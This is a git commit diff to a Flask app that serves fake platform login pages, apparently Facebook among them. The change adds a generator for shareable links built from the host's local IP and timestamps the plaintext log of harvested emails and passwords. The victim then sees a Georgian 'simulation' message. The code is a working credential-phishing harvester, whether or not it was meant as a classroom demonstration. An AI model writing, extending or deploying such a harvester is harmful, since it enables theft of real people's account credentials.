22656841c4595d06e3046685e604cea47603f722
Nika Sekhniashvili <n_sekhniashvili@cu.edu.ge>
2026-05-27 04:56:50 +0400

    Add files via upload

--- app.py
+++ app.py
@@ -1,11 +1,24 @@
 from flask import Flask, render_template, request
+import socket
+from datetime import datetime
 
 app = Flask(__name__)
 
 # მთავარი მენიუ
 @app.route('/')
 def home():
-    return render_template('menu.html')
+    generated_link = None
+    platform = request.args.get('platform')
+
+    if platform:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+
+        generated_link = f"http://{local_ip}:5000/{platform}"
+
+    return render_template('menu.html', link = generated_link)
 
 # ფეისბუქი
 @app.route('/facebook')
@@ -28,10 +41,11 @@ def login():
     platform = request.form.get('platform')
     email = request.form.get('email')
     password = request.form.get('password') 
+    time = datetime.now().strftime('%Y-%m-%d %H:%M::%S')
 
     #log.txt
     with open('log.txt', 'a', encoding='utf-8') as f:
-        f.write(f"[{platform}] Email: {email} | Password: {password}\n")
+        f.write(f"[{time}] [{platform}] Email: {email} | Password: {password}\n")
 
     return "<h1>სისტემური შეცდომა!</h1><p>ეს არის სიმულაცია. მონაცემები ჩაიწერა log.txt-ში.</p>"
 
